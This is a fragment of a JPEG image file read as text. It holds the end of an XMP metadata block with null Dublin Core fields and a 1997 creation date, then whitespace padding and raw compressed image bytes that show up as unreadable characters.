			</MicrosoftPhoto:LastKeywordXMP></rdf:Description><rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator><rdf:Seq xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Seq>
			</dc:creator><dc:rights><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:rights><dc:subject><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
			</dc:subject><dc:title><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:title><dc:description><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:description></rdf:Description><rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/"><xmp:CreateDate>1997-12-11T15:28:59.039</xmp:CreateDate><xmp:Rating>5</xmp:Rating></rdf:Description></rdf:RDF>
</x:xapmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                            <?xpacket end='w'?>ÿÛ C ÿÛ CÿÀ  
 
" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? úö²ý°¿o­3âÿ í
ð§Kð'¾xÃö³µø=¬~È¿~!xóÆšÇÆc Ïà¿iWËàýoÁ>¼Ñü
â_„³Ú\üp×´?Mâ(á:ñV·à™µ_ëÚ=ü5û;wû~|WðåÕÏ‡¼Wÿ îýª¥ñFƒq6âI|â?ƒ~(ðtºþ—#XëxOÄ×>5Ð.<Eá§Ô`¸m]ŸBÑfÕô³k¨K¤éÏpÖpþ?~ØpÃ©|Jÿ ‚–|HÔbŽÿ â'ìóâïÙ¾/€>=½n¼ið6/øª)|IÁïÎ$×>Çân.$×ÁwÚ"êÒO3ß‹†•ËN?ííî>øyà†yçðw†fši¢I%šY4K’Ydug’I‹»¹,ÌK1$“@ÿÙ